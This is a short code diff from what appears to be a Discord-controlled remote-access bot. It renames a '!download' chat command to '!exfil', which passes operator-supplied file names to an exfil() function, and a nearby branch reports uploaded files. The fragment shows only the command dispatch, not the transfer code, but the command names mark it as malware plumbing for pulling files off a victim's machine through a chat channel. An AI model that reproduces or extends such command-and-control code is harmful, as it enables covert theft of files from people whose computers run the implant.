@@ -387,12 +387,12 @@ async def on_message(message):
                     await message.channel.send(f"```File successfully uploaded: {file_path}```")
 
         #################
-        elif message.content.startswith('!download'):
+        elif message.content.startswith('!exfil'):
             try:
-                ex_filename = message.content[len('!download')+1:].split(',')
+                ex_filename = message.content[len('!exfil')+1:].split(',')
                 await exfil(message, ex_filename)
             except Exception as e:
-                await message.channel.send(f"`> cmd_!download` - An error occurred: {e}")
+                await message.channel.send(f"`> cmd_!exfil` - An error occurred: {e}")
         else:
             file_name = None
 
